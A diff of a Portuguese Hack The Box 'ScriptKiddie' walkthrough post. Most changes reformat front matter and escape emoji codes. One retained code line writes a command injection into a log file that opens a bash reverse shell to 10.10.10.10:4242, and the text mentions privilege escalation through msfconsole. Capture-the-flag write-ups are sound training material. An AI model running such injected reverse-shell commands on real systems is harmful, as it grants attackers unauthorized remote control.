@@ -1,24 +1,26 @@
 ---
-date: 2021-06-05 16:00:00
-images: 
-- https://i.imgur.com/Egv2O1k.png
+title: 'Walktrough: HTB ScriptKiddie'
 language: pt-BR
 localeid: htb-scriptkiddie
+date: 2021-06-05T16:00:00.000Z
 tags:
-- HackTheBox
-- HTB Easy
-- HTB Linux
-- Walktrough
-title: 'Walktrough: HTB ScriptKiddie'
-authors: ['default']
+  - HackTheBox
+  - HTB Easy
+  - HTB Linux
+  - Walktrough
+summary: ''
+images:
+  - 'https://i.imgur.com/Egv2O1k.png'
+authors:
+  - default
 ---
 
 Olá pessoal!
 
 A máquina desta semana será **ScriptKiddie**, outra máquina Linux classificada como fácil do [Hack The Box](https://www.hackthebox.eu), criada por [0xdf](https://app.hackthebox.eu/users/4935).
 
-:information_source: **Info**: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas
-[info]
+\:information\_source: **Info**: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas
+\[info]
 
 ![HTB ScriptKiddie](https://i.imgur.com/Igno8wu.png)
 
@@ -147,7 +149,7 @@ Uma vez que este script lê o conteúdo de um arquivo localizado no perfil do us
 echo "  ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4242 0>&1' #" > ~/logs/hackers
 ```
 
-Após definir o novo listener e alterar o arquivo `hackers`, um novo shell reverso foi retornado, desta vez com a conta `pwn` :smile:
+Após definir o novo listener e alterar o arquivo `hackers`, um novo shell reverso foi retornado, desta vez com a conta `pwn` \:smile:
 
 Enumerando novamente a máquina, desta vez a partir da conta deste novo usuário utilizando o `linpeas.sh`, notei que este user possuía direitos de execução do `msfconsole` de modo privilegiado.
 
@@ -178,4 +180,4 @@ msf6 >
 
 Espero que tenham gostado!
 
-Nos vemos no próximo post :smiley:
+Nos vemos no próximo post \:smiley:
